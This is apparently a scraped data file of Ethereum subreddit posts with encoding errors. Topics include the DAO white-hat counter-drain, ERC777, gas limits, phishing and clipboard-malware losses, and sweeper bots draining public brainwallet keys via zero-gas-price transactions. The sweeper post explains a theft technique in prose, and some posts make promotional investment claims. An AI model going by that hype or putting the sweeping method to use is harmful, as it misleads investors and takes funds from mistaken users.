Having our hands forced, the group decided to go forwards with the attack. I donated 100k dao tokens to the process with the full knowledge that it could be burned in the process. The more tokens the Robin contract had, the faster it could syphon the ether to protect it. The attacker picked up the pace and other attackers joined in. Some of the most efficient hackers were able to do up to 30 recursions with up to 200 ether moved in each, so it became clear that if we didn't do anything the DAO would be drained before anything could have been done.

We contacted some ""whales"" who were happy to donate to the effort and we were able to secure about 6M DAO tokens. We made it clear to everyone that we were not sure they would be able to recover these tokens, but these generous friends were happy to contribute to the effort. Thanks to this we were able to outpace the attacker, doing 4,000 and then at up to 40,000 ether per round, totaling up30 rounds of recursions.

All these attacks [can be studied on the blockchain]( http://etherscan.io/txsinternal?zero=true&a=0xbb9bc244d798123fde783fcc1c72d3bb8c189413&valid). This is the [child DAO of the Robin Hood attack](
https://etherscan.io/address/0xb136707642a4ea12fb4bae820f03d2562ebff487).

These three child daos were the ones in which a concurrent attack drained ether: [84ef](http://etherscan.io/address/0x84ef4b2357079cd7a7c69fd7a37cd0609a679106), [f4c6](http://etherscan.io/address/0xf4c64518ea10f995918a454158c6b61407ea345c) and [aeeb](
http://etherscan.io/address/0xaeeb8ff27288bdabc0fa5ebb731b6f409507516c). We know nothing about them and if any of these are parallel white hat attacks then this is the right time to come forward. If you happen to be the curator of any of these child daos, or happened to have split with them into one of them, please come forward as well do come forward as well as you can help with this effort. There might be others.

### What now?

7.2M ethers from the DAO are now  held in a child DAO and we hold the private keys of the curator. It's important to identify the other 2  - but the risk has been reduced from 20 thousand attackers down to only 2. As soon as that DAO matures, we will try to move all the funds in a refund contract, that will be much simpler than the DAO was. Of course we still need to be very careful with that code and to analyze it for any possible exploit.

If you own the addresses **0xb97ba16dfafa8fc5824c029f0653cc03a1796e99** or **0xe1e278e5e6bbe00b2a41d49b60853bf6791ab614** please come forward.

There is a lot of unaccounted ether, on the main attacker dao and other copycat attacks. If you are the curator in any of them, you might be very useful. If you are the hacker, then all I can say is we are coming for you. There are many [plans in place to attack the child daos and either block the funds or recover them](https://blog.slock.it/a-dao-counter-attack-613548408dd7).

### What about forks? 

I've made my opinion clear many times about my opposition to a hard fork that breaks code or balance immutability, so I don't think this is the place to discuss it. 

The child daos are also vulnerable to the same kinds of attacks so it's important to identify everyone else on the same child dao as the main whitehat. There are very valid points for a limited, voluntary, temporary software upgrade in which miners will be able to prevent other attacks like this from happening, and they may be used to prevent further attacks on these child DAOs. We now hope we bought enough time to stay calm and rational about these.


### What about what's left in the DAO?

There are still plans to retrieve the remainder of the DAO and I can't discuss it further. But most of the ether is now more secure and there are some interesting advantages on having some money left [which will allow the DAO itself to buy tokens into the bad splits and attack them to recover or block the ether](https://blog.slock.it/a-dao-counter-attack-613548408dd7#.sthdgppgx).

0,ethereum,"Everything you need to know about ERC777, the new proposed token standard but were afraid to ask If you've been to ethereum for more than 5 minutes, you've heard the phrase ERC20, to refer to ethereum tokens. ERC stands for Ethereum Request for Comments and it's nothing more than a topic on the main Ethereum Improvement proposals GitHub, that help multiple main developers debate definitions of improvements, future forks and contract standards.

Contract standards are one of the most important thing in ethereum: the reason so many projects can issue a token that can be used in other wallets, or exchanged via decentralized exchanges or really used for anything else, is that they all use a set of same standards, basically a ""balanceOf"" call that tells you how many tokens you have and a ""transfer"" function that tells you to transfer these tokens from me to you.

Token standard has been one of the first proposed standards and were talked about and debated by multiple users until finally formally written down by /u/feindura/ which also implemented it in Ethereum Wallet, first wallet to adopt it.

What are the main issues with the current ERC20? Many. The first glaring one is how to transfer tokens to contracts. Because you can send tokens to any ethereum address, you can easily also send them to contracts which do not support them, locking them forever. Worse than that: even if the tokens can be manually moved, it's very hard to tell which tokens came from who, and try sending them back.

To solve that, the ERC20 used to have a **approve** function that would allow you to approve the transfer to a contract and then you needed to create a second transaction, letting the contract know you had approved it. This required two transactions, had multiple security issues and was not widely implemented.

Multiple token standard have been proposed since ERC20, to solve that famously ERC223 and the ""aproveAndCall"" standards. Others have been tried to augment the functionality of tokens by allowing off chain signing to transfer without needing ether, or private transfers that use zksnarks or ring signatures to add privacy to tokens. None had much momentum, but ERC777 seems to be getting it, because it implememts all in a more elegant way:

https://github.com/ethereum/EIPs/issues/777

#### Backwards compatible

Making your token ERC777 compatible will make it compatible with more important functions of ERC20 (and you can implement the rest and make it fully compatible)

#### Safer and simpler send to contract

Introduces a new transfer function that adds a third field called bytes where you can add any identifying information to the transfer and it automatically lets the receiving contract that the transfer occurred, so it can do something automatically

#### Sets decimals to default 18 

This a controversial move: many people feel that it was a mistake to add custom decimals to ERC20. The idea being that its not very useful to add lower limits on the divisibly of your token (and it doesn't make sense to add more thann 18) and adding custom decimals make writing offline wallets like Trezor, harder. ERC777 doesn't remove the decimals, but defaults it to 18.

#### Adds Approved Operators

The idea is that you give a contract the right to move tokens in your behalf, which means that you can build contracts that enhance your token, independent of the token needing to implement it. Want to add anonymity? Authorize a mixer contract as an approved operator. Worried about backups? Add an emergency recovery service that can move all your tokens out if you lose your keys. People can improve your tokens, years after they were created.  This allows the contract full access to the contracts, so any sort of limitation (like daily limits based on exchange rate) needs to be built in the token itself.

### What else?

The standard is not finalized, and that's where you come in. Make your opinion known, what do you like or dislike about it? What would you want changed differently? Next time you meet someone building a new token, ask them about their opinion on this standard."

0,ethereum,"ETH is money Beyond the technical, most people don‚Äôt know what Ethereum really is or the fundamental reasons why Ether is valuable.

**Why is ETH valuable?**

Right now, the world's economic networks are mostly nation states. We talk of the US economy or the European economy or the Chinese economy

But crypto allows the separation of economy from nation state

Like the US, Ethereum is an economic network

And just as USD is the reserve currency of the US, Ether is the reserve currency of the Ethereum economy

**ETH is a triple-point asset**

 Ether is three types of asset in one:

First, when deposited into a staking contract Ether acts as a capital asset, like USD in a T-Bill‚Äîstaked Ether generates a return denominated in Ether which secures the Ethereum economy

Second, Ether is the required currency to pay for gas in the Ethereum economy, just as USD is required to pay taxes for the security & infrastructure of the US economy‚Äîas the Ethereum economy grows the demand for Ether grows

Third, when locked in a collateralized loan or lent out for interest or stored in a savings account, Ether acts as a money like USD‚Äîas the Ethereum economy increases in size & influence and as Ether is increasingly used as a money, Ether‚Äôs monetary premium increases

*Note: while the first and second uses of Ether outlined above drive demand, it‚Äôs likely the third ETH as money will be most significant value driver for Ether by far, just as the use of USD as a money is the primary reason USD is valuable relative to other currencies*

**DAI is stabilized ETH**

As a speculative asset in an emerging global economy, Ether is volatile. Poor for day-to-day transactions. Fortunately, the Ethereum economy has an embedded volatility-killer, a secondary stablecoin called DAI

DAI is tethered to USD so that 1 DAI = 1 USD

DAI is governed by a decentralized central bank in the Ethereum economy called Maker. Every DAI is backed by an overcollateralized amount of Ether, so DAI is essentially a synthetic version of Ether, only...stable!

Ether & DAI are symbiotic reserve currencies of the Ethereum economy, Ether is the store-of-value money for holding, while DAI is the day-to-day money for spending

**Why is this magical?**

More than a non-sovereign currency, Ethereum is a non-sovereign economy

It's permissionless like the internet, censorship-resistant like BitTorrent, a public good like TCP/IP

A decentralized financial system for the world

And it‚Äôs just getting started

https://putyourfuckingtextonthefuckingblockchain.com/


Hi guys, so for the last couple of ~~months~~ days I've been working on an Ethereum smart contract thingy. It's a small little project and I'd like to hear your opinion.

The idea is roughly as follows.

I like money. So I created a smart contract which stores your message forever on the blockchain (in the form of a string) if you make a transaction which has a higher value than the previous one. 

I also made a website which displays the latest string in a super large font and bolded letters for all the world to see. There is a javascript script running on it which enables you to instantly pay and submit your message (using metamask). There is another script running which displays the message on the actual blockchain.

I'm a super noob at solidity and I welcome all feedback! It's all open source and available for you to scrutiny.

I crossposted this to r/ethdev as well! I hope more and more small cool projects will be built on ethereum and I'd like to hear your opinion!

EDIT: so I created a twitter acc which will contain all the previous messages! Enjoy :)

0,ethereum,"Miners: Increase the capacity of the Ethereum blockchain with this one weird trick This is so simple it will shock you.

Set a higher `targetgaslimit`.

Let me explain why this is a good idea.

Recently the network has been having trouble handling peak traffic from ICOs. A lot of people seem to agree that the network could handle higher throughput. It's widely been proposed that the way to do this is for miners who are currently implementing a cap to stop doing that, resulting in what the client software will do by default: The limit gets voted up when usage is close to capacity.

So far has this hasn't really worked in practice. Part of the problem is that not everyone has been willing or able to change their settings, so a minority of miners continue to vote the limit down even when the network is close to capacity. But another problem is that the adjustment algorithm is quite timid. It will vote the limit down if the previous block is empty, or if the previous block has a small number of transactions. These are quite common behaviours by miners trying to minimize their orphan risk, and they're unlikely to change them, no matter how much we yell at them.

It would be possible to modify the software to tweak the automatic adjustment to be more aggressive, for example by targeting blocks that are half-full instead of two-thirds-full. But the automated adjustment doesn't seem like a great fit for the current situation anyhow.

To see why, think about why do we have a block gas limit. 

 * Prevent DoS
 * Protect the ability to run nodes
 * Prevent big miners using a propagation advantage

If the automated adjustment was working, it would fail at these things. 

If a DoS attacker finds a new way to attack the network, they can either fill up the blocks for a while to grow it, or wait for a peak from an ICO. Worse, since the adaptive limit takes a bit of time to adapt, they can create a (albeit short-lived) backlog at will.

The adaptive limit has no idea whether people's geth nodes are falling over, unless things are getting so bad that mining nodes are stopping. If it was working, and the demand was there, it would simply supply it.

Preventing big miners using a propagation advantage is about the idea that miners with large share would use the fact that they don't have to propagate to themselves to mine blocks with lots of low-value transactions that aren't competitive for anyone else. But in practice, we're currently seeing the opposite: It's the big miners who are charging high fees and mining blocks without many transactions in them.

There may be some useful strategies that can be automated, like targeting a particular uncle rate. But what we've got wouldn't be what we need even if it was working, which it isn't, so it's better to do it manually for a while. Stop waiting for the adaptive thing to kick in. If you think the network can handle more capacity, just vote the peak capacity limit up, regardless of usage. Something like:

`geth --targetgaslimit 8000000`

`parity --gas-floor-target 8000000 --gas-cap 10000000`

0,ethereum,"We desperately need more --lightserve nodes !!!!!!! Ethereum Wallet has this great feature called sync with ligh client network. This gives you a functional working program (so no webbrowser needed) that can interact with the Ethereum network, while only downloading about 1 GB of data. This is ESSENTIAL for most people on this planet, as they don't have very fancy and expensive hardware. However recently there have been bugs in the latest version of geth leading to a very unstable light mode network. There are not enough peers available to serve everybody and this leads to possible new peers never getting connected, if they would they would be able to help other light mode users. So the light mode network is getting starved. Please developers, fix the bugs that lead to bad connectivity. And users here,  you can help by running a Ethereum Wallet in light mode so there will be more light nodes available. Also Parity developers please make a light mode version for your wallet that is compatible so that users from both wallets can get connected to each other. 

There is such great opportunity for Ethereum to actually get the user adoption that Bitcoin sold out on. The community is alive, the developers are united, the network is stable, transactions are fast and cheap.

So please fix these bugs and let's get that light mode network working properly it will help people like me that might not currently have the resources to store 20 GB of data but are smart enough they want to interact with the Ethereum network without having to use a webbrowser. (always keep business and pleasure separated) 

I want to user Ethereum more and more for payments but right now when I go online, I have to leave my laptop connected to the internet for about 20 hours just to get enough connectivity with other light mode peers to download a couple 100 MB of extra block headers. And because of a bug sometimes the lighchain get corrupted and it can take 30 - 40 hours for me to get 1 GB of lightchain data, while if I download something over bittorrent at 500 kb/s it only takes 33 minutes to download 1 GB.

We need more lighserve nodes!!!!!! The demand is currently very very high. 

edit: So the problem is that the latest protocol update has made peer discovery less reliable, and this hits harder in lightmode because there are less lightserve nodes, probablly because the lightserve  option is off by default when you run geth (because lightmode is still experimental). On github I have seen people advise to run geth 1.7.2 instead of 1.7.3 but I can't confirm for myself it that is a good fix. On Linux, after geth is running, you can launch Ethereum Wallet and it will see geth is running. If you just launch Ethereum Wallet I think it opens it internally or something and since the last update I  think it is using geth 1.7.3.

I just got scammed the way I never even thought is possible ( some of you might heard about this but I never heard until today).

Decided to cash some money out thru Coinbase, logged-in and copied BTC wallet address thru built-in Copy function as it shows on the screenshot below.

Logged in Binance to sent the BTC to Coinbase and just pasted the address from the buffer without second thought. Pushed the transaction. 1hour later I realized that its different address and only first 4 symbols are same. Somehow my copy-paste buffer changed the address from right one to wrong one.

Money lost. No way to recover it. Please dont repeat my mistake do not blindly trust to copy-paste buffer , your computer could be infected with malware that swaps addresses and it will be too late when you realize that.

P.S:

Since Coinbase not showing whole address and first 4 symbols were the same it was very easy to overlook

P.P.S:

heres the ""wrong address""  [https://blockchair.com/bitcoin/address/36cZUcWME52EF33Af8a6JCdm233jgmViXd](https://blockchair.com/bitcoin/address/36cZUcWME52EF33Af8a6JCdm233jgmViXd)  you can verify with a screenshot that first 4 symbols are same and last 4 hidden.

0,ethereum,"All my Ethereum stolen out of my wallet **UPDATE** My Thank You Letter First off, I'd like to thank everyone who worked with me yesterday to help me with the loss of my BTC and ETH.  I learned a lot through conversations with many of you and I can't thank you guys enough.  

In the wake of all this madness, a kind redditor reached out to me in a private message offering to reimburse the ETH I had lost, so long as I beefed up my own security.  We exchanged back and forth for a while, discussing better security measures and new options for storing my coins.  He was kind of enough to share his own knowledge and experience with me and I was happy to listen.  Whether or not he intended to actually help me recover my losses, and to what extent, was somewhat unimportant as I obviously had much to learn.  Ultimately, he generously gifted me nearly **all** of the money I had lost.  

I was blown away to say the least and don't ever recall a stranger showing me so much kindness.  I'd like to publicly thank this redditor (who has asked that he remain anonymous for good reason) for not only gifting me the coins I lost, but for educating me while restoring just a bit of my faith in humanity.  Something I think we'll all pretty short on these days.  

This experience has shown that everyone is prone to error and that you can never be too careful.  But it has also shown me that every once in a while, strangers tend to show some kindness to others.  Additionally, it has reaffirmed my belief that it is always the best course of action to admit fault in an attempt to learn from your experience.  Pretending you did nothing wrong *only makes things worse.*  I intend to build upon this experience and sincerely hope that I can do the same thing for someone, someday.  I am very excited about the cryptocurrency space as a whole and fully plan on becoming as involved as possible.  However, without the help of the community, I would have been totally lost.  Now, I can take this experience and share it with others to prevent future things like this from happening.  

That being said, if anyone who comes across this thread is curious about BTG (BitcoinGold) please be extremely careful about your information.  **Never** give out your personal seed for your wallet!  I know that should be obvious but anyone can be fooled.

Thanks again everyone, you've all been a huge help! Also, shoutout to /u/jprichardson (Exodus Co-Founder) for showing up and helping figure out the source of the hack.

**TL;DR**: I lost a significant amount of money in a hack and a kind redditor reimbursed me for my losses.

Edit: This is for those who are asking how the attack was carried out and what mistakes I made. (Mostly copy pasta from the other thread)

> While it makes me feel like a dumbass, I did attempt to check MyBTGWallet as I was curious about BTG and wanted to know if there was any to claim etc. Initially, I went to https://bitcoingold.org and saw their address check box, after inputting my address, I seem to recall there being a link to https://mybtgwallet.com/ underneath the box. So, I clicked on it and was brought to the site, but as I was extremely hesitant to give out any of my information, I tried to assure myself it was legit. It displayed a valid SSL Certificate at the time of my visiting so I decided I would proceed. Unfortunately, this makes it pretty clear that it was all my fault. I'm embarrassed to say the least, and certainly heartbroken at my losses. I guess I'm a little new and didn't think much of it when I was asked for my seed, looking back that's pretty fucking stupid, there's no reason they my seed right? But the valid SSL had me fooled. I will surely never do something so stupid again and will take steps to increase security on my own. However, I do think BTG and MyBTGWallet should take some blame for this as they are not ensuring the security of their users/potential users but ultimately this is clearly my fault.

/u/jprichardson expands more on in detail as to how this happened here: https://www.reddit.com/r/ethereum/comments/7d7sq8/all_my_ethereum_stolen_right_out_of_my_wallet/dpwphw5/

As for safer practices.  I've ordered a hardware wallet and plan to store all of my coins on there from now on.  In the meantime, I've enabled 2FA on just about everything I own.  (Email, Facebook, etc.)  I moved all of my coins off of my desktop as many of you have recommended; as they apparently exhibit more vulnerabilities than other options.  I've also locked away all of my keys in a much safer, password-protected place, but plan to move all of those offline as soon as my new wallet arrives.  I've also reset my Google Chrome settings, deleted any saved passwords that might carry over to anything important, and cleared cookies, history etc. as well as changed all of my passwords to make them much more secure. 

As for advice from the anonymous donor.  Here are some of the things he shared with me.

* He advised that even with a hardware wallet, malware can intercept transactions and change the destination address before it goes into your wallet, so exercise extreme caution when making transactions and try and make them from a *clean* system ~~is~~ if you have access to one. 
* Exercise caution if you are a miner and try not to store any of your coins on said mining rig as they can be easy targets for malware.  If possible, use separate machines for trading, storing, and mining. Another option for this is to create a virtual machine where software is segregated -or- even consider swapping out HDDs (possibly one with Linux instead of Windows) to to trading operations.
* Double check that the address has not been changed in your clipboard by pasting it elsewhere before initiating your transactions.
* Minimize the amount of software on the computer you are doing your trading on to reduce risk of infection.  In addition, use a clean browser with no extensions (except for Metamask which apparently protects against phishing attacks).  

Thanks everyone for reading.  Sorry for the wall of text.


**TL;DR 2**: I stupidly gave out my 12-word recovery seed to site that appeared safe.

It's not easy to have real transactions to test a public blockchain, people don't use it just for the sake of it. So cryptokitties is heaven for preparing the network to other more important (though less furry and cute) applications. 

Welcome cryptokitties for a better, faster and more awesome Ethereum!"
0,ethereum,"Serenity, Proof-of-Stake, Sharding - all that is completely unrelated to protocol upgrades on the Ethereum 1.0 chain. Please, read this and try to understand this.

It does not matter whether Constantinople comes six weeks earlier or later. Proof-of-Stake, Sharding, and everything else that is involved in the Serenity milestone will happen whenever it is ready.

The teams researching and building on the 2nd iteration of Ethereum are independently working on Ethereum 2.0 and Proof-of-Stake will not be delayed because we postpone a protocol upgrade on the legacy chain.

Furthermore, it's important to understand that Proof-of-Stake, the so-called ""phase 0"" / the ""beacon chain,"" will not be a hardfork, unlike other milestones. We will see beacon chain testnets very soon, within weeks or months. And I expect that we can reach the Serenity milestone within a year, optimistically speaking.

But please, understand that this is pretty much detached to what is happening on the current network (or what's not happening)."
0,ethereum,"Solidity programming for absolute noobs Is there anyone interested in creating a useful tutorial for programming in Solidity, for absolute noobs in programming in general.

I have never spent enough time in any programming language in the past (yes, I did some BASIC on C64 and the first steps writing a ""hello world"" following the steps from a tutorial). But other interests just drawed too much attention. Choices needed to be made.

But now I'm interested in programming in Solidity, but all tutorials start from a minimum knowledge in programming in general. A tutorial that focusses purely on the EVM and ignores any need for other luggage from past experiences would be great, imo.

I even think if such a tutorial is very good, it would blow the practical potential of the EVM and the (true) value of ETH & Ethereum."
0,ethereum,"Ethereum isn't about price and hashrate, it's about making applications that could change the world. I know Reddit is the worst possible place to judge true sentiment around a topic but as we're all aware, this sub has been toxic lately.

I've been around the crypto space for about 4 years now and I left the Bitcoin community about 2 years ago because of the constant obsession with price.  I felt that it really stunted any growth or innovation in the community, people just wanting to get rich off the idea and not progress.

That eventually led me here due to the drive of the community to come together and make game changing ideas come to life.  The reality is, as a lot seem stuck on debating price and hashing power, hundreds of great dapp ideas are being worked on right now.  August will be a great month for some of these apps to launch and the future is incredibly bright.  Just watching the Consensys intern hackathon and following a lot of the top devs on twitter will make you realize all of the great work going on behind the scenes.

Don‚Äôt be influenced by trolls who are trying to make you lose confidence.  The reality is we are very close to having some of our first dapps with the potential to go mainstream.  Quit worrying about price and hash rate, that‚Äôs not why we‚Äôre here."

0,ethereum,"We're aiming to train 1000 developers for free in 2019! We need your help to do it. Hey everyone!

If you've been around this subreddit for a while you've seen us before. We've been training developers on Ethereum for 4 years now!

**We've just launched our first [community education programme](https://blockstars.b9lab.com) at GoerliCon [together with the Department of Decentralisation](https://medium.com/ethberlin/building-blocks-dod-and-b9lab-for-blockchain-education-729b41320fc1), the team behind EthBerlin!**

B9lab is committing to co-sponsor up to 500 free seats to students and we are looking for organisations and individuals from the community to help us fund the other half. So for every seat sponsored we provide another one for free. Every seat is 999DAI, the contribution address is available on [blockstars.b9lab.com](https://blockstars.b9lab.com). We've got sponsorship packages, hit me up if your organisation want to support this project and be involved in the student channels, workshops etc.

The programme is aimed at people who are already developers, regardless of circumstances and background, but have not been able to learn about Ethereum yet. Developers apply and go through a simple screening test. Applications are open now and will run through February. On the 1st of March we will select the best students and invite them to the learning platform. The number obviously depends on how many seats we can raise DAI for. 

The course itself is online and self-paced, a mix of text, images, videos, screencasts and animations. Students do coding exercises and our mentors provide code review and feedback. Mentors also stand by to answer questions and guide students through tough spots. We're covering blockchain basics, in-depth Solidity, EVM, deployment, Web3 and Truffle.

But we also want to make the course fun and colourful so if you would like to organise a talk, remote workshop, local learning group or similar, please ping me.

So, we are looking for sponsors and collaborators to make this happen! Looking forward to working with you guys to make this happen. 

I'll try to answer any questions asap :) "
0,ethereum,"Good news coming in the next weeks and months This month:

* microRaiden. Achieves instantly and without fees **thousands of transactions per second.** This first version is for Ethereum tokens, which makes trivial the transfer of ETH too (see explanation 1 at the end of the post).
* Casper test network. Casper is the next version of Ethereum, where everyone can be a ""miner"" and earn money, because Ethereum abandons the electricity-wasting mining invented by Bitcoin. With Casper, being a miner means staking ETH in the network and offering a very little bit of computer power. Miner's money is left intact and (s)he is rewarded if (s)he does a good job. The security does not arise from energy wasting computations, but because any attempt to cheat the security will be penalised by the network (ETH removed from the stake). **It means that people are incited to accumulate ETH now and hold once Casper is alive.** The more you buy now that the price is cheap, the more you can earn later.

In 2018:

* ETH futures. **Futures trading is coming** before June 2018, as announced by Bloomberg a few days ago.
* Upgrade of the network, with an intermediary version before Casper, based on hybrid security : traditional miners will still be able to mine, and **stakers will also be allowed**, as described above. Later, Casper will be fully deployed, only staking will be possible.
* More than 200 companies (such as Intel, Microsoft, JP Morgan, ING, Bank of America, UBS, Mastercard, ...) are part of the **Enterprise Ethereum Alliance**. They started to develop almost one year ago and the first outcomes might be released.

0,ethereum,"A Christmas Mystery: sweepers and zero gas price transactions For the last couple weeks I've been following some accounts that have a bunch of old brainwallet keys and compete with each other to steal ether that is continually deposited into accounts, either via mistake or misconfiguration. I've seen them mentioned once or twice, usually by /u/rya_nc in regards to the empty password parity account: 

https://etherscan.io/address/0x00a329c0648769a73afac7f9381e08fb43dbea72

There's not a ton of information about this practice out there, but much of it is related to BTC rather than ETH, but I've heard them referred to as sweepers as they sweep deposited funds out of accounts as fast as they can.

You can see in the brainwallet for '' (as in no password) that a few different accounts compete for the funds that are deposited here. One of the common addresses you can find is [0x957cD4Ff9b3894FC78b5134A8DC72b032fFbC464](https://etherscan.io/address/0x957cd4ff9b3894fc78b5134a8dc72b032ffbc464) which I'll refer to here as 957.

Now, 957 has been quite lucrative in this endeavor, collecting something like $23M in ethereum and $900k in tokens over two years.

Not too unusual up until this point, plenty of sweepers do the same thing (most not nearly to the same success rate) and make a good amount of cash stealing from people who make mistakes.

But all this competition between sweepers leads to some interesting situations like in the case of this empty password brainwallet account, which has a supply of $13k worth of minereum tokens and a private key that anyone can look up.

[minereum (MNE) ERC20 Token Tracker](https://etherscan.io/token/0x1a95b271b0535d15fa49932daba31ba612b52946?a=0x00a329c0648769a73afac7f9381e08fb43dbea72)

However, since any transactions to this account are quickly swept away, it's impossible to send enough gas for a token transfer because it's gone nearly as fast as it arrives - usually within two blocks.

It's fascinating to see some money locked in the blockchain not because of an address mistake (which is a fairly regular occurrence), but because of the collective actions of a bunch of people interacting with the chain.

## A Minereum Mystery
So I check this account relatively frequently to see how the various players are doing and the other day I was surprised to notice that some of the minereum that I thought was locked in this account was leaving this account and headed to 957, like this one:

[Ethereum Transaction 0xb1050b324f02e9a0112e0ec052b57013c16156301fa7c894ebf2f80ac351ac22](https://etherscan.io/tx/0xb1050b324f02e9a0112e0ec052b57013c16156301fa7c894ebf2f80ac351ac22)

This was immediately interesting as this minereum was supposed to be untouchable in this account. How was 957 removing it?

It wasn't immediately clear but it appears that 957 had submitted a few transactions with a normal gas limit but zero gas price, meaning there's zero tx gas cost and the transfer can be included in blocks even though there's no gas to pay for it.

But since there's no gas associated with the transaction, there's  no conceivable reason why a miner would include such a transaction in one of their mined blocks. You might know this if you've tried to buy or interact with a cryptokitty recently and your gas price was set too low - you probably wait a long time for your transaction to be included. But these zero gas price transactions were being included immediately in a block.

That was fascinating - how did these transactions get included in the chain?

## Sweeps Become Miners

The mystery started to reveal itself when I realized that all of these zero gas price transactions have been included in blocks mined by 0xE4E359702A4Ab1F9C7b2f1A4da8064492eC1D41A, a miner that has been operating for the last 11 days:

https://etherscan.io/address/0xe4e359702a4ab1f9c7b2f1a4da8064492ec1d41a#mine

Presumably 957 had the brilliant idea that they could include whatever transactions they wanted if they only had access to a mining pool. And with $23M in the bank, why not buy your own pool?

There are payments made to Genesis from this account so it seems reasonable that this is paying for a cloud miner but I'm not familiar enough with the setups of cloud miners to understand how one can decide to include zero gas price transactions in their own.

So 957 waits for their GPUs to mine a block, and immediately adds ~5 zero gas price transactions to the normal selection of txpool transactions picked up by their node, sweeping tokens to the 957 account and submitting it normally.

957 also uses this opportunity to move funds out of accounts where the balance is low enough that it doesn't make sense to pay a tx fee to move that low amount otherwise. Yes, it might not be worth it for a single transaction, but if you've got enough of these accounts with $5 in them then it can accumulate over time and add up to real money. Or at least they think so. Here's one of these low value with zero gas price transactions:

[Ethereum Transaction 0x9506fc85ab3836744025a41dfe66076d53a10d70b9f2008cbfc4eb1bbb393820](https://etherscan.io/tx/0x9506fc85ab3836744025a41dfe66076d53a10d70b9f2008cbfc4eb1bbb393820)

Cloud mining may be barely break even normally, but with the extra bonus of trapped tokens and these accounts with very low amounts on top, paying someone to host hardware to mine ethereum might actually be worth it for 957.

---

I find these sorts of meta-games inside of a system that isn't designed specifically for them very interesting, and after watching for a while I finally felt like I had enough information to put something together describing what's going on.

I'll keep watching, of course, for continuing developments. There are still a lot of interesting angles to explore here. Here are some of the questions I still have about the process. If you've got theories, please chime in!

* Why does 957 make these tiny transactions to pull 3 minereum at a time from these accounts with no gas price? Could they not include all 30k minereum at once from accounts like this: https://etherscan.io/address/0x5b5b9f1cbc0062c61ab73577e02301c07f5b66fa#tokentxns
* I've never seen anyone sweep any ether away in less than two blocks time, i.e. eth is sent as part of block 4700000 and then is taken in a tx as part of block 4700002. I'm guessing that there's something about the details of how the txpool works that prevents this from happening in one block but I'd be curious to know what that actually is.
* Zero gas price is a weird thing for the network to tolerate - does this make sense in some cases or is this something that should be disallowed on the network?"
0,ethereum,"READ: Dear Ethereum Community. We Have A Problem! **Intro:**  


I am hoping that a community here can vote this up so the problem reaches the core and wider community members and can be given a higher priority. It looks like most people are not aware of this being a major issue as such.  


I represent an engineering team of 14 people and for the last couple of years we have been heavily buidling on a full time basis. We are ideologically inclined to build applications that are truly decentralized. The key parameter for us is to have apps that can INDEPENDENTLY VERIFY the state of blockchain and can‚Äôt be controlled, censored or blocked.  


**The problem:**  


We build decentralised apps so I will take one such app as an example.

In a context of crypto wallet mobile app it‚Äôs possible to have the above criteria met for the Bitcoin, Bitcoin Cash, Dash and many other Bitcoin forks but not for the Ethereum just yet.  


The main issue is that there are just way too few Ethereum nodes that are eager to serve the SPV enabled clients. A decentralized app (is an SPV client) needs to be able to validate the state it receives from the blockchain rather than TRUST some middle man (ex: [infura.io](http://infura.io/)).  


As there are way too few nodes an SPV-enabled app is not able to synchronize with and validate the state of the blockchain within the acceptable time duration. It's a SERIOUS problem for mobile devs who are trying (will try) to build truly decentralised apps because a mobile app has an average session of just a few minutes.  


We have built a wallet app that has an SPV mode for BTC, BCH, DASH and ETH. And while the code for ETH (known as LES client) is in place it simply doesn't work in a practical sense. In the next release we are deliberately going to encourage users NOT TO ENABLE LES mode because the app will take several days if not more to sync with the ETH blockchain while for all other blockchains it's a matter of a few hours. The sync time is significantly faster on those blockchains as there are plenty of nodes that are always online and available to serve the SPV client.  


As a community we CAN NOT expect to see decentralised apps built on top of Ethereum before this problem is addressed. An app which doesn't work in a decentralised manner is NOT CENSORSHIP RESISTANT and is PRONE TO MANIPULATION.  


**Potential solution:**  


A temporary fix that should significantly improve the current state of affairs is if the LESS protocol setting on the Geth node enabled by default. This would surely make things harder for miners.

An alternative option would be to get something similar to [https://vipnode.org](https://vipnode.org)

0,ethereum,"Ethereum on ARM. Raspberry Pi 4 images release based on Ubuntu 20.04 64 bit. Turn your Raspberry Pi 4 into an Eth 1.0 or Eth 2.0 node just by flashing the MicroSD card. Memory issues solved and new monitoring dashboards. Installation guide. **TL;DR:** **Flash your Raspberry Pi 4, plug in an ethernet cable, connect the SSD disk and power up the device to turn the Raspberry Pi 4 into a full Ethereum 1.0 node or an Ethereum 2.0 node (beacon chain / validator)**

Some background first. As you know, we‚Äôve been running into some memory issues \[1\] with the Raspberry Pi 4 image as Raspbian OS is still on 32bits \[2\] (at least the userland). While we prefer to stick with the official OS we came to the conclusion that, in order to solve these issues, we need to migrate to a native 64 bits OS

Besides, Eth 2.0 clients don‚Äôt support 32 bits binaries so using Raspbian would exclude the Raspberry Pi 4 from running an Eth 2.0 node (and the possibility of staking).

So, after several tests we are now releasing 2 different images based on Ubuntu 20.04 64bit \[3\]: Eth 1.0 and Eth 2.0 editions.

Basically, both are the same image and include the same features of the Raspbian based images. But they are setup for running Eth 1.0 or Eth 2.0 software by default

**Images take care of all the necessary steps**, from setting up the environment and formatting the SSD disk to installing and running the Ethereum software as well as starting the blockchain synchronization.

# Main features

* Based on Ubuntu 20.04 64bit
* Automatic USB disk partitioning and formatting
* Adds swap memory (ZRAM kernel module + a swap file) based on Armbian work \[7\]
* Changes the hostname to something like ‚Äúethnode-e2a3e6fe‚Äù based on MAC hash
* Runs software as a systemd service and starts syncing the Blockchain
* Includes an APT repository for installing and upgrading Ethereum software
* Includes a monitoring dashboard based on Grafana / Prometheus

# Software included

Both images include the same packages, the only difference between them is that Eth 1.0 runs Geth by default and Eth 2.0 runs Prysm beacon chain by default.

**Ethereum 1.0 clients**

* Geth \[8\]: 1.9.13 (official binary)
* Parity \[9\]: 2.7.2 (cross compiled)
* Nethermind \[10\]: 1.8.28 (cross compiled)
* Hyperledger Besu \[11\]: 1.4.4 (compiled)

**Ethereum 2.0 clients**

* Prysm \[12\]: 1.0.0-alpha6 (official binary)
* Lighthouse \[13\]: 0.1.1 (compiled)

**Ethereum framework**

* Swarm \[14\]: 0.5.7 (official binary)
* Raiden Network \[15\]: 0.200.0\~rc1 (official binary)
* IPFS \[16\]: 0.5.0 (official binary)
* Statusd \[17\]: 0.52.3 (compiled)
* Vipnode \[18\]: 2.3.3 (official binary)

# INSTALLATION GUIDE AND USAGE

# Recommended hardware and setup

* Raspberry 4 (model B) - 4GB
* MicroSD Card (16 GB Class 10 minimun)
* SSD USB 3.0 disk (see storage section)
* Power supply
* Ethernet cable
